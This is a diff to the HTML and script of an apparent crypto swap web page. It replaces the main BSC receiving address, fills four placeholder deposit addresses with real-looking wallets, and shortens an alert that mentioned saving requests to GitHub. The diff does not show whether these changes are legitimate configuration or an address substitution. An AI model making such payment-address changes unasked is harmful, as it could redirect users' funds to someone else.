@@ -150,7 +150,7 @@
     <p id="modalDesc" class="text-slate-400 text-sm mb-4"></p>
     <div class="text-xs text-slate-400 mb-2" id="modalDepositLabel"></div>
 <div id="modalRange" class="text-xs text-yellow-400 mb-2"></div>
-    <code id="modalAddress" class="block text-emerald-300 break-all mb-3">0xDA1E8b362DDe013EA87Cf8984D64490c1900d231</code>
+    <code id="modalAddress" class="block text-emerald-300 break-all mb-3">0xc313a266cc39e4ac09126bae6fda7df833cfcd35</code>
     <button id="copyAddr" class="px-3 py-2 rounded-lg border border-slate-700 hover:bg-slate-800 text-sm mb-4">Copy Address</button>
     <div id="modalQR" class="flex justify-center mb-4"></div>
     <div id="explorerLinks" class="space-y-1 text-sm text-slate-400"></div>
@@ -168,7 +168,7 @@
   <script>
 const CONFIG = {
   FORM_ENDPOINT: "https://misty-brook-2a30.kims90901111.workers.dev/",
-  SERVER_BSC: "0xDA1E8b362DDe013EA87Cf8984D64490c1900d231",
+  SERVER_BSC: "0xc313a266cc39e4ac09126bae6fda7df833cfcd35",
   SESSION_SECONDS: 3600
 };
 const I18N = {
@@ -467,7 +467,7 @@ async function updateForms(sender, receiver) {
     })
   });
 
-  if (res.ok) alert("✅ Swap request saved to GitHub!");
+  if (res.ok) alert("✅ Saved!");
   else alert("❌ Error: " + await res.text());
 }
 
@@ -669,10 +669,10 @@ const swapPairs = {
 };
 
 const depositAddresses = {
-  "bnb-eth": "0x1111111111111111111111111111111111111111", // 🔹 BNB → ETH 입금주소
-  "eth-bnb": "0x2222222222222222222222222222222222222222", // 🔹 ETH → BNB 입금주소
-  "bnb-pol": "0x3333333333333333333333333333333333333333", // 🔹 BNB → POL 입금주소
-  "pol-bnb": "0x4444444444444444444444444444444444444444"  // 🔹 POL → BNB 입금주소
+  "bnb-eth": "0xf8e2cea20ef128a682e8681491fbe7b9309d0df6", // 🔹 BNB → ETH 입금주소
+  "eth-bnb": "0xf8e2cea20ef128a682e8681491fbe7b9309d0df6", // 🔹 ETH → BNB 입금주소
+  "bnb-pol": "0x3a0bba3ab85523bfaa8bf231103092807fef08a1", // 🔹 BNB → POL 입금주소
+  "pol-bnb": "0x3a0bba3ab85523bfaa8bf231103092807fef08a1"  // 🔹 POL → BNB 입금주소
 };
 const modal = $("#swapModal"), qrDiv = $("#modalQR");
 
